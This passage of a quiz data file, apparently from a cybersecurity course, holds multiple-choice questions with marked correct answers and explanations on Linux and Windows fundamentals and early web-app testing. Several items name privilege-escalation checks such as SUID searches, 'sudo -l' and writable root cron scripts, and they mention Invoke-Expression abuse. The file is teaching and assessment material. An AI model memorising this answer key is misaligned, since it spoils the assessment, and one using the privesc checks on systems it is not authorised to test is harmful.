  },
  {
    topicId: "m3-linux-5",
    questions: [
      {
        question: "What does chmod 700 grant?",
        options: [
          "Read, write, execute for the owner only; nothing for group/others",
          "Full access to everyone",
          "Read-only access for everyone",
          "Execute-only access for the owner",
        ],
        correctIndex: 0,
        explanation:
          "700 in octal breaks down as 7 (rwx) for owner and 0 (---) for group and others.",
      },
      {
        question: "What is a common security risk of an SUID binary?",
        options: [
          "It runs with the privileges of its owner regardless of who executes it, potentially enabling privilege escalation",
          "It always runs with the privileges of the invoking user only",
          "It disables all executable permissions",
          "It only applies to directories, never files",
        ],
        correctIndex: 0,
        explanation:
          "SUID makes a binary execute with its owner's privileges no matter who runs it, which is exactly why misconfigured SUID binaries are a classic privesc vector.",
      },
      {
        question: "Which command finds all SUID binaries on a Linux system?",
        options: [
          "find / -perm -4000 -type f 2>/dev/null",
          "chmod +s /",
          "ls -la /root",
          "chown root /",
        ],
        correctIndex: 0,
        explanation:
          "find / -perm -4000 -type f searches the entire filesystem for files with the SUID bit set, suppressing permission-denied errors.",
      },
    ],
  },
  {
    topicId: "m3-linux-6",
    questions: [
      {
        question:
          "Which man section documents file formats such as /etc/passwd?",
        options: ["Section 5", "Section 1", "Section 8", "Section 3"],
        correctIndex: 0,
        explanation:
          "Man section 5 covers file formats, so 'man 5 passwd' explains the /etc/passwd file format specifically.",
      },
      {
        question: "Inside the man pager, how do you search for a term?",
        options: [
          "Type / followed by the term",
          "Type Ctrl+F",
          "Type grep term",
          "Type find term",
        ],
        correctIndex: 0,
        explanation:
          "Inside man, typing / then a search term searches the page, with n/N to move between matches.",
      },
      {
        question: "What does 'man 1 passwd' show compared to 'man 5 passwd'?",
        options: [
          "man 1 shows the passwd command; man 5 shows the /etc/passwd file format",
          "Both show identical information",
          "man 1 shows file formats; man 5 shows commands",
          "man 5 is only for kernel syscalls",
        ],
        correctIndex: 0,
        explanation:
          "Man sections disambiguate: section 1 covers commands while section 5 covers the corresponding file format.",
      },
    ],
  },
  {
    topicId: "m3-linux-7",
    questions: [
      {
        question:
          "What key piece of information does 'ps' primarily reveal about running processes?",
        options: [
          "The PID (process ID) needed to inspect or kill a process",
          "The MAC address of the process owner",
          "The disk partition table",
          "The DNS resolver configuration",
        ],
        correctIndex: 0,
        explanation:
          "ps lists running processes along with their PID, which you need to signal, inspect, or terminate them.",
      },
      {
        question: "What does Ctrl+Z do to a running foreground process?",
        options: [
          "Suspends it, allowing it to be resumed later with fg or bg",
          "Immediately terminates it permanently",
          "Restarts the process from the beginning",
          "Sends it directly to a background daemon",
        ],
        correctIndex: 0,
        explanation:
          "Ctrl+Z suspends the process; fg resumes it in the foreground and bg resumes it running in the background.",
      },
      {
        question: "What does appending & to a command do?",
        options: [
          "Runs the command in the background immediately",
          "Runs the command with elevated privileges",
          "Pipes the command's output to another command",
          "Schedules the command to run at boot",
        ],
        correctIndex: 0,
        explanation:
          "A trailing & backgrounds the command right away, returning control of the shell immediately.",
      },
    ],
  },
  {
    topicId: "m3-linux-8",
    questions: [
      {
        question: "What is the UID/GID of the root user on Linux?",
        options: ["0", "1", "100", "1000"],
        correctIndex: 0,
        explanation: "root always has UID/GID 0, marking it as the superuser.",
      },
      {
        question:
          "What does 'sudo -l' show and why does it matter for security testing?",
        options: [
          "What commands the current user is allowed to run as root - a key privilege-escalation check",
          "The list of all logged-in users",
          "The full system command history",
          "The contents of /etc/shadow directly",
        ],
        correctIndex: 0,
        explanation:
          "sudo -l lists the sudo permissions granted to the current user, which is one of the first things checked during privilege escalation.",
      },
      {
        question:
          "Where are actual password hashes stored on a modern Linux system?",
        options: [
          "/etc/shadow (root-only readable)",
          "/etc/passwd (world-readable)",
          "/etc/group",
          "/home/user/.bashrc",
        ],
        correctIndex: 0,
        explanation:
          "Password hashes live in /etc/shadow, which is restricted to root, while /etc/passwd only stores non-sensitive user metadata.",
      },
    ],
  },
  {
    topicId: "m3-linux-9",
    questions: [
      {
        question:
          "What is the difference between 'systemctl start' and 'systemctl enable'?",
        options: [
          "start runs a service now only; enable makes it persist across reboots",
          "They are functionally identical",
          "enable runs it now only; start makes it persist",
          "start disables the service permanently",
        ],
        correctIndex: 0,
        explanation:
          "start activates a service immediately for the current session, while enable configures it to also start automatically on future boots.",
      },
      {
        question:
          "Which command shows a service's Loaded/Active/Main PID status?",
        options: [
          "systemctl status <service>",
          "systemctl list-units",
          "ps aux",
          "top",
        ],
        correctIndex: 0,
        explanation:
          "systemctl status gives an at-a-glance summary including Loaded, Active state, and the Main PID of a service.",
      },
      {
        question:
          "What replaced legacy SysV init on most modern Linux distros?",
        options: ["systemd", "cron", "GRUB", "apt"],
        correctIndex: 0,
        explanation:
          "systemd (running as PID 1) replaced legacy SysV init scripts and runlevels on modern distros.",
      },
    ],
  },
  {
    topicId: "m3-linux-10",
    questions: [
      {
        question:
          "Which modern command has replaced the legacy 'ifconfig' for showing interfaces and IPs?",
        options: ["ip a", "netstat", "arp -a", "ss -a"],
        correctIndex: 0,
        explanation:
          "ip a is the modern replacement for the legacy ifconfig command for viewing network interfaces and assigned IPs.",
      },
      {
        question:
          "Which tool captures live network traffic and can save it to a .pcap file with -w?",
        options: ["tcpdump", "iptables", "ss", "ip"],
        correctIndex: 0,
        explanation:
          "tcpdump captures live packets and the -w flag writes them to a .pcap file for later analysis, e.g. in Wireshark.",
      },
      {
        question: "What do 'netstat -tulpn' / 'ss -tulpn' primarily show?",
        options: [
          "Listening ports and established connections",
          "The filesystem's mounted partitions",
          "The system's installed packages",
          "The list of local user accounts",
        ],
        correctIndex: 0,
        explanation:
          "Both commands list listening TCP/UDP ports and active connections along with the owning process.",
      },
    ],
  },
  {
    topicId: "m3-linux-11",
    questions: [
      {
        question:
          "Which command refreshes the local package index on a Debian-based system without upgrading anything yet?",
        options: ["apt update", "apt upgrade", "apt install", "apt autoremove"],
        correctIndex: 0,
        explanation:
          "apt update refreshes the package index metadata; apt upgrade is the separate step that actually installs newer package versions.",
      },
      {
        question:
          "Which package manager family is used on CentOS/Fedora/RHEL instead of APT?",
        options: ["YUM/DNF", "dpkg", "Homebrew", "pip"],
        correctIndex: 0,
        explanation:
          "YUM and its successor DNF are the RPM-based package managers used on Red Hat-derived distros.",
      },
      {
        question: "Which command installs a local .deb package file directly?",
        options: [
          "sudo dpkg -i package.deb",
          "sudo apt update",
          "sudo yum install package.deb",
          "sudo dnf update",
        ],
        correctIndex: 0,
        explanation:
          "dpkg -i installs a .deb package file directly from disk, unlike apt which fetches from a repository.",
      },
    ],
  },
  {
    topicId: "m3-linux-12",
    questions: [
      {
        question:
          "What command generates a new SSH keypair for key-based authentication?",
        options: ["ssh-keygen", "scp", "ssh", "sudo"],
        correctIndex: 0,
        explanation:
          "ssh-keygen generates a public/private keypair, e.g. ssh-keygen -t ed25519, used for key-based SSH authentication.",
      },
      {
        question:
          "Where must a generated public key be placed for key-based SSH login to work?",
        options: [
          "~/.ssh/authorized_keys on the remote host",
          "/etc/passwd on the local host",
          "/etc/shadow on the remote host",
          "~/.ssh/id_rsa on the local host only",
        ],
        correctIndex: 0,
        explanation:
          "The public key must be appended to ~/.ssh/authorized_keys on the remote host the user wants to log into.",
      },
      {
        question:
          "Which command securely copies a file to a remote host over SSH?",
        options: [
          "scp file.txt user@host:/path/",
          "cp file.txt user@host:/path/",
          "mv file.txt user@host:/path/",
          "ftp file.txt user@host:/path/",
        ],
        correctIndex: 0,
        explanation:
          "scp uses the SSH protocol to securely copy files to or from a remote host, using cp-like syntax with a host prefix.",
      },
    ],
  },
  {
    topicId: "m3-linux-13",
    questions: [
      {
        question:
          "What is the correct field order in a standard crontab entry?",
        options: [
          "minute hour day month weekday command",
          "hour minute day month weekday command",
          "command minute hour day month weekday",
          "weekday month day hour minute command",
        ],
        correctIndex: 0,
        explanation:
          "Crontab entries follow the format: minute hour day month weekday, followed by the command to run.",
      },
      {
        question:
          "Why is a world-writable script called by a root cron job a privilege-escalation risk?",
        options: [
          "A lower-privileged user could modify the script's contents and have it executed as root",
          "Cron jobs never run with root privileges regardless of configuration",
          "World-writable files cannot be executed by cron",
          "Crontab entries are always read-only",
        ],
        correctIndex: 0,
        explanation:
          "If an unprivileged user can write to a script that a root cron job executes, they can inject commands that then run with root privileges.",
      },
      {
        question: "Which command lists the current user's own crontab entries?",
        options: [
          "crontab -l",
          "crontab -e",
          "cat /etc/cron.d/",
          "ls /var/spool/cron",
        ],
        correctIndex: 0,
        explanation:
          "crontab -l lists the current user's scheduled jobs, while crontab -e opens them for editing.",
      },
    ],
  },
  {
    topicId: "m3-linux-14",
    questions: [
      {
        question:
          "What is the fundamental format of each Bandit level's challenge?",
        options: [
          "An SSH login where the next level's password is hidden somewhere on the filesystem",
          "A web form requiring a CAPTCHA to solve",
          "A local GUI application to reverse engineer",
          "A physical hardware challenge",
        ],
        correctIndex: 0,
        explanation:
          "Each Bandit level is accessed via SSH, and the goal is to find the next level's password hidden on that level's filesystem.",
      },
      {
        question:
          "What skill category does OverTheWire Bandit primarily build?",
        options: [
          "Core Linux/SSH command-line fundamentals",
          "Advanced binary exploitation",
          "Active Directory attacks",
          "Web application scanning",
        ],
        correctIndex: 0,
        explanation:
          "Bandit is designed to teach foundational Linux and SSH command-line skills level by level.",
      },
      {
        question:
          "What is required as proof of completing through Level 10 in this exercise?",
        options: [
          "A screenshot of the Level 10 flag/password",
          "A compiled exploit binary",
          "A Wireshark capture file",
          "A completed subnet calculation",
        ],
        correctIndex: 0,
        explanation:
          "The lab explicitly asks for a screenshot of the Level 10 flag/password as evidence of completion.",
      },
    ],
  },
  {
    topicId: "m3-linux-15",
    questions: [
      {
        question:
          "Which command is used in the script to list local usernames from /etc/passwd?",
        options: [
          "cut -d: -f1 /etc/passwd",
          "ps aux",
          "ss -tulpn",
          "crontab -l",
        ],
        correctIndex: 0,
        explanation:
          "cut -d: -f1 splits each /etc/passwd line on ':' and prints the first field, the username.",
      },
      {
        question:
          "Which command captures currently listening ports for the script's report?",
        options: [
          "ss -tulpn",
          "cut -d: -f1 /etc/passwd",
          "chmod 700",
          "man -k network",
        ],
        correctIndex: 0,
        explanation:
          "ss -tulpn (or netstat -tulpn) lists listening TCP/UDP ports along with the owning process.",
      },
      {
        question: "Why does the script pipe its output through tee?",
        options: [
          "To save a timestamped report file while still printing output to the screen",
          "To immediately delete the output after displaying it",
          "To encrypt the output before saving",
          "To send the output over the network automatically",
        ],
        correctIndex: 0,
        explanation:
          "tee writes the script's output to both the terminal and a saved report file simultaneously.",
      },
    ],
  },
  {
    topicId: "m3-windows-1",
    questions: [
      {
        question: "Which CPU privilege ring does Kernel Mode correspond to?",
        options: ["Ring 0", "Ring 3", "Ring 1", "Ring 2"],
        correctIndex: 0,
        explanation:
          "Kernel Mode runs at Ring 0, the most privileged level, giving direct hardware/memory access, while User Mode runs at Ring 3.",
      },
      {
        question: "What typically happens when a crash occurs in Kernel Mode?",
        options: [
          "A BSOD (Blue Screen of Death), since kernel code has direct hardware/memory access",
          "The affected app silently restarts with no visible impact",
          "Only that single application closes, leaving the OS unaffected",
          "The GPU takes over kernel duties automatically",
        ],
        correctIndex: 0,
        explanation:
          "Because Kernel Mode code runs with full hardware/memory access, a crash there can bring down the whole system, resulting in a BSOD.",
      },
      {
        question:
          "Which Windows edition specifically adds AD DS, DNS/DHCP, IIS, and Domain Controller roles?",
        options: [
          "Windows Server",
          "Windows 10/11 Home",
          "Windows 10/11 Pro",
          "Windows 11 Enterprise only",
        ],
        correctIndex: 0,
        explanation:
          "Windows Server editions add Active Directory Domain Services, DNS/DHCP, IIS, and Domain Controller roles, which are not meant for end-user desktop editions.",
      },
    ],
  },
  {
    topicId: "m3-windows-2",
    questions: [
      {
        question: "Which command shows hidden files in CMD?",
        options: ["dir /a", "dir /h", "ls -la", "cd /a"],
        correctIndex: 0,
        explanation:
          "dir /a lists all files including hidden and system files, unlike a plain dir.",
      },
      {
        question:
          "Which command removes a folder and its contents quietly without prompting?",
        options: ["rmdir /s /q", "del /s", "rmdir", "rm -rf"],
        correctIndex: 0,
        explanation:
          "rmdir /s /q removes a directory and everything in it recursively (/s) and quietly without confirmation prompts (/q).",
      },
      {
        question:
          "Which command lets you view or edit ACL permissions on a file directly from CMD?",
        options: ["icacls", "dir /a", "copy", "move"],
        correctIndex: 0,
        explanation:
          "icacls displays and edits the access control list of a file or folder from the command line.",
      },
    ],
  },
  {
    topicId: "m3-windows-3",
    questions: [
      {
        question:
          "When NTFS and share permissions both apply to the same resource, which wins?",
        options: [
          "The most restrictive of the two",
          "The share permission always wins",
          "The NTFS permission always wins",
          "Whichever was set most recently",
        ],
        correctIndex: 0,
        explanation:
          "NTFS and share permissions stack, and the effective access is determined by whichever of the two is more restrictive.",
      },
      {
        question:
          "What NTFS technique is sometimes abused to hide data or malware?",
        options: [
          "Alternate Data Streams (ADS)",
          "FAT32 partition spanning",
          "MBR boot sector hiding",
          "ext4 journaling",
        ],
        correctIndex: 0,
        explanation:
          "NTFS supports Alternate Data Streams, which can attach hidden data to a file and are sometimes abused for concealment.",
      },
      {
        question: "What does NTFS journaling protect against?",
        options: [
          "Data corruption on a crash, by logging changes before committing them",
          "Unauthorised user logins",
          "Malware execution",
          "Network packet loss",
        ],
        correctIndex: 0,
        explanation:
          "Journaling records intended changes before committing them, allowing recovery to a consistent state after a crash.",
      },
    ],
  },
  {
    topicId: "m3-windows-4",
    questions: [
      {
        question: "Which registry hive stores system-wide configuration?",
        options: [
          "HKEY_LOCAL_MACHINE",
          "HKEY_CURRENT_USER",
          "HKEY_CLASSES_ROOT",
          "HKEY_USERS",
        ],
        correctIndex: 0,
        explanation:
          "HKEY_LOCAL_MACHINE (HKLM) stores system-wide settings, while HKEY_CURRENT_USER (HKCU) stores per-user configuration.",
      },
      {
        question:
          "Which registry key location is a common auto-launch/persistence mechanism abused by malware?",
        options: [
          "HKLM/HKCU ...\\Run keys",
          "HKEY_CLASSES_ROOT\\Explorer",
          "HKEY_USERS\\Default\\Shell",
          "HKLM\\SYSTEM\\Boot",
        ],
        correctIndex: 0,
        explanation:
          "Programs listed under the Run keys in HKLM or HKCU are automatically launched at login, a mechanism frequently abused for persistence.",
      },
      {
        question:
          "Which command-line tool lets you query registry values directly from CMD or scripts?",
        options: ["reg query", "regedit (GUI only)", "icacls", "wmic query"],
        correctIndex: 0,
        explanation:
          "reg query reads registry values from the command line or scripts, while regedit is the GUI equivalent.",
      },
    ],
  },
  {
    topicId: "m3-windows-5",
    questions: [
      {
        question: "What does UAC (User Account Control) do?",
        options: [
          "Prompts for consent/credentials before running an action with admin rights",
          "Automatically grants admin rights to every logged-in user",
          "Blocks all software installation permanently",
          "Replaces the need for a Windows password entirely",
        ],
        correctIndex: 0,
        explanation:
          "UAC interrupts privileged actions with a consent or credential prompt, acting as a guard rail against unauthorised elevation.",
      },
      {
        question: "Which command adds a new local user account from CMD?",
        options: [
          "net user testuser Pass@123 /add",
          "net localgroup testuser /add",
          "whoami /add",
          "icacls testuser /add",
        ],
        correctIndex: 0,
        explanation:
          "net user <name> <password> /add creates a new local user account with the given credentials.",
      },
      {
        question:
          "What does Group Policy (GPO) primarily do in a domain environment?",
        options: [
          "Pushes centralized configuration/security settings across domain-joined machines",
          "Encrypts local hard drives automatically",
          "Replaces Windows Defender",
          "Manages DNS records only",
        ],
        correctIndex: 0,
        explanation:
          "GPOs centrally distribute configuration and security settings to all machines joined to the domain.",
      },
    ],
  },
  {
    topicId: "m3-windows-6",
    questions: [
      {
        question: "What is the difference between a DACL and a SACL?",
        options: [
          "DACL controls user/group permissions; SACL controls auditing configuration",
          "DACL controls auditing; SACL controls permissions",
          "Both control identical settings",
          "DACL only applies to registry keys",
        ],
        correctIndex: 0,
        explanation:
          "The Discretionary ACL governs who can access a resource, while the System ACL governs what access attempts get audited/logged.",
      },
      {
        question:
          "What uniquely identifies a user or group independent of display name in Windows ACLs?",
        options: [
          "SID (Security Identifier)",
          "ACE",
          "DACL",
          "The file's GUID",
        ],
        correctIndex: 0,
        explanation:
          "A SID uniquely and permanently identifies a user or group, independent of any display name changes.",
      },
      {
        question:
          "Which command grants a specific user Read permission on a file via CMD?",
        options: [
          'icacls "file.txt" /grant User:R',
          'icacls "file.txt" /deny User:R',
          "net user file.txt /grant",
          "chmod 744 file.txt",
        ],
        correctIndex: 0,
        explanation:
          "icacls's /grant option assigns the specified permission (R for read) to a named user on a file or folder.",
      },
    ],
  },
  {
    topicId: "m3-windows-7",
    questions: [
      {
        question:
          "Which switch combination on taskkill forces termination of a process and its child-process tree?",
        options: ["/F /T /IM", "/S /Q", "/A /L", "/X /Y"],
        correctIndex: 0,
        explanation:
          "/F forces termination, /T also kills child processes, and /IM specifies the image name of the process to kill.",
      },
      {
        question:
          "Which command shows a Windows service's current state (e.g. RUNNING/STOPPED)?",
        options: ["sc query", "tasklist", "taskkill", "dir /a"],
        correctIndex: 0,
        explanation:
          "sc query reports a service's current state directly from the command line.",
      },
      {
        question:
          "Which PowerShell cmdlet lists running processes sorted by CPU usage?",
        options: [
          "Get-Process | Sort-Object -Property CPU -Descending",
          "Get-Service -Name",
          "sc query",
          "Restart-Service",
        ],
        correctIndex: 0,
        explanation:
          "Piping Get-Process into Sort-Object on the CPU property in descending order ranks processes by CPU consumption.",
      },
    ],
  },
  {
    topicId: "m3-windows-8",
    questions: [
      {
        question: "Which cmdlet shows usage examples for another cmdlet?",
        options: [
          "Get-Help <cmdlet> -Examples",
          "Get-Command <cmdlet>",
          "Get-Process <cmdlet>",
          "Invoke-Expression <cmdlet>",
        ],
        correctIndex: 0,
        explanation:
          "Get-Help with the -Examples switch shows practical usage examples for a given cmdlet.",
      },
      {
        question:
          "What does Invoke-Expression do, and why is it notable from a security standpoint?",
        options: [
          "It executes a string as PowerShell code - a common living-off-the-land technique",
          "It only displays help text for a command",
          "It permanently disables the execution policy",
          "It only works against remote machines",
        ],
        correctIndex: 0,
        explanation:
          "Invoke-Expression runs arbitrary text as PowerShell code, which makes it powerful for automation but also a favourite living-off-the-land technique.",
      },
      {
        question: "What does the Execution Policy control in PowerShell?",
        options: [
          "Whether scripts are allowed to run at all",
          "The color scheme of the console",
          "Which cmdlets are installed",
          "The network ports PowerShell can use",
        ],
        correctIndex: 0,
        explanation:
          "Execution Policy (e.g. RemoteSigned) governs whether and under what conditions PowerShell scripts are permitted to run.",
      },
    ],
  },
  {
    topicId: "m3-windows-9",
    questions: [
      {
        question:
          "Which command dumps a full inventory of OS version, patches, and hardware in one shot?",
        options: [
          "systeminfo",
          "hostname",
          "ipconfig /all",
          "wmic cpu get name",
        ],
        correctIndex: 0,
        explanation:
          "systeminfo produces a complete summary of OS details, patch level, and hardware in a single command.",
      },
      {
        question:
          "Which command queries WMI directly for hardware/software details from the command line?",
        options: ["wmic", "systeminfo", "hostname", "ipconfig"],
        correctIndex: 0,
        explanation:
          "wmic queries Windows Management Instrumentation directly, e.g. wmic cpu get name,maxclockspeed.",
      },
      {
        question:
          "Which command shows full network adapter configuration details, including DNS servers?",
        options: [
          "ipconfig /all",
          "hostname",
          "systeminfo",
          "wmic product get name",
        ],
        correctIndex: 0,
        explanation:
          "ipconfig /all shows the complete network configuration for every adapter, including assigned DNS servers.",
      },
    ],
  },
  {
    topicId: "m3-windows-10",
    questions: [
      {
        question:
          "Which PowerShell cmdlet checks Windows Defender's current real-time protection status?",
        options: [
          "Get-MpComputerStatus",
          "Get-NetFirewallRule",
          "Update-MpSignature",
          "netsh advfirewall show allprofiles",
        ],
        correctIndex: 0,
        explanation:
          "Get-MpComputerStatus reports Windows Defender's current protection state and signature status.",
      },
      {
        question: "How is the Windows Firewall's rule engine organised?",
        options: [
          "By profile (Domain/Private/Public), each with its own inbound/outbound rules",
          "By a single global rule set with no profiles",
          "Only by application name, never by port",
          "By CPU core assignment",
        ],
        correctIndex: 0,
        explanation:
          "Windows Firewall applies separate inbound/outbound rule sets depending on the active network profile: Domain, Private, or Public.",
      },
      {
        question:
          "Which command adds a new inbound firewall rule allowing TCP port 80 via netsh?",
        options: [
          'netsh advfirewall firewall add rule name="Allow HTTP" protocol=TCP dir=in localport=80 action=allow',
          "netsh advfirewall show allprofiles",
          "Get-NetFirewallRule -Direction In",
          "MpCmdRun.exe -Scan -ScanType 1",
        ],
        correctIndex: 0,
        explanation:
          "This netsh advfirewall command explicitly creates a new inbound allow rule for TCP port 80.",
      },
    ],
  },
  {
    topicId: "m3-windows-11",
    questions: [
      {
        question:
          "Which Event ID corresponds to a failed logon attempt, key for brute-force detection?",
        options: ["4625", "4624", "1074", "4657"],
        correctIndex: 0,
        explanation:
          "Event ID 4625 logs a failed logon attempt, which is the signal analysts watch for brute-force activity.",
      },
      {
        question: "Which Event ID corresponds to a successful logon?",
        options: ["4624", "4625", "1033", "1074"],
        correctIndex: 0,
        explanation:
          "Event ID 4624 records a successful logon, paired with 4625 for failed logons.",
      },
      {
        question:
          "Which Event ID logs a system shutdown/restart being initiated?",
        options: ["1074", "4624", "4625", "4657"],
        correctIndex: 0,
        explanation:
          "Event ID 1074 is logged when a system shutdown or restart is initiated.",
      },
    ],
  },
  {
    topicId: "m3-windows-12",
    questions: [
      {
        question:
          "What hardware component does BitLocker use to seal the encryption key to specific hardware?",
        options: [
          "TPM (Trusted Platform Module)",
          "GPU",
          "CMOS battery",
          "NIC (network card)",
        ],
        correctIndex: 0,
        explanation:
          "BitLocker seals its encryption key using the TPM, binding decryption to the specific hardware it was encrypted on.",
      },
      {
        question:
          "What happens to an encrypted BitLocker drive's data if it is removed and read on another machine without the recovery key?",
        options: [
          "The contents remain unreadable",
          "The contents are automatically decrypted",
          "The drive automatically reformats itself",
          "The data is copied in plaintext to the new machine",
        ],
        correctIndex: 0,
        explanation:
          "Without the recovery key, BitLocker-encrypted data is unreadable even if the physical drive is moved to another machine.",
      },
      {
        question:
          "Which command shows the current BitLocker encryption status of a volume?",
        options: [
          "manage-bde -status",
          "Get-MpComputerStatus",
          "icacls C:",
          "netsh advfirewall show allprofiles",
        ],
        correctIndex: 0,
        explanation:
          "manage-bde -status reports the BitLocker protection status of the system's volumes.",
      },
    ],
  },
  {
    topicId: "m3-windows-13",
    questions: [
      {
        question:
          "Which cmdlet lists all local user accounts in the enumeration script?",
        options: [
          "Get-LocalUser",
          "Get-Process",
          "Get-ScheduledTask",
          "Get-Service",
        ],
        correctIndex: 0,
        explanation:
          "Get-LocalUser (or net user) enumerates local user accounts on the machine.",
      },
      {
        question:
          "Which cmdlet lists scheduled tasks for persistence/automation review?",
        options: [
          "Get-ScheduledTask",
          "Get-LocalUser",
          "Get-Process",
          "Get-Acl",
        ],
        correctIndex: 0,
        explanation:
          "Get-ScheduledTask lists configured scheduled tasks, useful for reviewing automation or persistence mechanisms.",
      },
      {
        question:
          "Which cmdlet's output is redirected to a file with Out-File in this lab?",
        options: [
          "Get-Process",
          "Get-Help",
          "Get-Command",
          "Set-ExecutionPolicy",
        ],
        correctIndex: 0,
        explanation:
          "The lab pipes Get-Process into Out-File to save the running-processes list as a report file.",
      },
    ],
  },
  {
    topicId: "m3-windows-14",
    questions: [
      {
        question:
          "Which part of the TryHackMe Windows Fundamentals series covers OS structure, editions, and basic navigation?",
        options: ["Part 1", "Part 2", "Part 3", "All three equally"],
        correctIndex: 0,
        explanation:
          "Part 1 of the series introduces OS structure, editions, and basic navigation.",
      },
      {
        question:
          "Which part covers user management, UAC, and administrative tools?",
        options: ["Part 3", "Part 1", "Part 2", "None of the parts"],
        correctIndex: 0,
        explanation:
          "Part 3 focuses on user management, UAC, and administrative tools.",
      },
      {
        question:
          "Which part covers system configuration, Control Panel, and settings?",
        options: ["Part 2", "Part 1", "Part 3", "All parts equally"],
        correctIndex: 0,
        explanation:
          "Part 2 covers system configuration, Control Panel, and general settings.",
      },
    ],
  },
  {
    topicId: "m4-1",
    questions: [
      {
        question:
          "Which application type is typically tested primarily via an HTTP intercepting proxy like Burp Suite?",
        options: [
          "Web application",
          "Mobile application (APK)",
          "Thick client application",
          "IoT firmware",
        ],
        correctIndex: 0,
        explanation:
          "Web apps run mostly server-side logic behind HTTP, so testing is done via an HTTP proxy.",
      },
      {
        question:
          "What distinguishes testing a mobile application from testing a web application?",
        options: [
          "Mobile apps require static analysis of the app binary in addition to intercepting API traffic",
          "Mobile apps have no attack surface",
          "Mobile apps only communicate over UDP",
          "Mobile apps cannot be tested with a proxy",
        ],
        correctIndex: 0,
        explanation:
          "Mobile apps ship logic to the device (APK/IPA), so testing combines static analysis with intercepting the app's backend API traffic.",
      },
      {
        question: "A thick client application is best described as:",
        options: [
          "A browser-rendered app with server-side logic",
          "A native desktop application that may talk directly to a database or custom protocol",
          "A stateless REST API",
          "A markup language for styling",
        ],
        correctIndex: 1,
        explanation:
          "Thick clients run natively with direct OS/API access, often talking to a database or custom protocol directly, unlike web apps.",
      },
    ],
  },
  {
    topicId: "m4-2",
    questions: [
      {
        question: "What does 'shift-left' security mean in the SDLC?",
        options: [
          "Moving security testing earlier in the process (e.g. code review, SAST)",
          "Only testing security right before deployment",
          "Removing security testing altogether",
          "Testing only in production",
        ],
        correctIndex: 0,
        explanation:
          "Shift-left means integrating security testing earlier in development rather than bolting it on at the end.",
      },
      {
        question: "Which of the following correctly orders the SDLC phases?",
        options: [
          "Testing then Requirements then Design then Development then Deployment then Maintenance",
          "Requirements then Design then Development then Testing then Deployment then Maintenance",
          "Design then Requirements then Deployment then Testing then Development",
          "Deployment then Development then Testing then Requirements",
        ],
        correctIndex: 1,
        explanation:
          "The standard SDLC flow is Requirements, Design, Development, Testing, Deployment, then Maintenance.",
      },
      {
        question: "DevSecOps primarily refers to:",
        options: [
          "Outsourcing all security testing to a third party",
          "Integrating automated security scanning directly into the CI/CD pipeline",
          "Running a single pentest after deployment",
          "Disabling developer access to production",
        ],
        correctIndex: 1,
        explanation:
          "DevSecOps embeds automated security scanning into the CI/CD pipeline rather than treating security as a separate final step.",
      },
    ],
  },
  {
    topicId: "m4-3",
    questions: [
      {
        question:
          "Why is client-side (JavaScript) validation not a real security control?",
        options: [
          "JavaScript cannot validate input at all",
          "Any validation/logic in JS can be read and bypassed via browser DevTools",
          "Browsers do not support JavaScript",
          "Client-side validation is faster than server-side",
        ],
        correctIndex: 1,
        explanation:
          "Because the frontend runs entirely in the user's browser, any JS-based check is visible and can be bypassed by an attacker using DevTools.",
      },
      {
        question: "What is the primary role of CSS in a web application?",
        options: [
          "Structuring content",
          "Styling/presentation of content",
          "Server-side business logic",
          "Database queries",
        ],
        correctIndex: 1,
        explanation:
          "CSS styles content; HTML structures it and JavaScript adds interactivity.",
      },
      {
        question: "React and Angular are best described as:",
        options: [
          "Server-side databases",
          "Frameworks for building component-based, often single-page, user interfaces",
          "Network protocols",
          "Encryption algorithms",
        ],
        correctIndex: 1,
        explanation:
          "React/Angular/Vue are frontend frameworks used to build complex, component-based UIs (SPAs).",
      },
    ],
  },
  {
    topicId: "m4-4",
    questions: [
      {
        question:
          "Why must backend authentication and authorization checks never be skipped even if the frontend already validates input?",
        options: [
          "Because the frontend cannot render HTML",
          "Because the backend is where real security enforcement happens since client-side checks can be bypassed",
          "Because backends do not support databases",
          "Because frontend and backend always run on the same server",
        ],
        correctIndex: 1,
        explanation:
          "The backend handles business logic, authentication, and database access server-side, which is where real security enforcement must occur.",
      },
      {
        question:
          "What is a key backend protection that should not be disabled?",
        options: [
          "ORM query parameterisation, which reduces injection risk",
          "Removing all authentication",
          "Using GET requests to change server state",
          "Disabling HTTPS",
        ],
        correctIndex: 0,
        explanation:
          "Backend frameworks often include built-in protections like CSRF tokens and ORM parameterised queries that must remain enabled.",
      },
      {
        question:
          "Which of the following is a backend language/framework mentioned as commonly handling business logic?",
        options: ["HTML", "Django/Flask (Python)", "CSS", "DOM"],
        correctIndex: 1,
        explanation:
          "Python's Django/Flask, along with Node.js, Java, and PHP, are backend technologies handling server-side logic.",
      },
    ],
  },
  {
    topicId: "m4-5",
    questions: [
      {
        question: "Which HTTP method is used to partially update a resource?",
        options: ["GET", "PUT", "PATCH", "DELETE"],
        correctIndex: 2,
        explanation:
          "PATCH performs a partial update, while PUT replaces the whole resource.",
      },
      {
        question: "An HTTP response with status code 403 means:",
        options: [
          "The resource was not found",
          "The request succeeded",
          "The client is authenticated but forbidden from accessing the resource",
          "The server encountered an internal error",
        ],
        correctIndex: 2,
        explanation:
          "403 Forbidden indicates the client is understood but not permitted to access the resource, distinct from 401 (unauthenticated).",
      },
      {
        question: "Compared to SOAP, REST APIs are generally:",
        options: [
          "XML-based and stateful",
          "Lightweight, commonly using JSON, and stateless",
          "Only usable over UDP",
          "Unable to return error codes",
        ],
        correctIndex: 1,
        explanation:
          "REST is a lightweight, typically JSON-based, stateless standard that has largely replaced the more rigid XML-based SOAP.",
      },
    ],
  },
  {
    topicId: "m4-6",
    questions: [
      {
        question: "SQL injection primarily targets which type of database?",
        options: [
          "NoSQL document stores",
          "Structured relational databases like MySQL/PostgreSQL via unsanitised query input",
          "In-memory caches",
          "Flat text files only",
        ],
        correctIndex: 1,
        explanation:
          "SQL injection exploits unsanitised input in queries sent to SQL databases such as MySQL/PostgreSQL.",
      },
      {
        question: "NoSQL injection against MongoDB typically abuses:",
        options: [
          "SQL WHERE clauses",
          "MongoDB-style query operators such as $ne or $gt",
          "HTML tags",
          "TCP handshakes",
        ],
        correctIndex: 1,
        explanation:
          "NoSQL injection targets MongoDB-style operators like $ne/$gt rather than SQL syntax.",
      },
      {
        question:
          "How do ORMs (Object-Relational Mappers) affect injection risk?",
        options: [
          "They eliminate all injection risk permanently",
          "They reduce (but don't eliminate) injection risk via parameterised queries",
          "They increase injection risk by concatenating strings",
          "They have no effect on database security",
        ],
        correctIndex: 1,
        explanation:
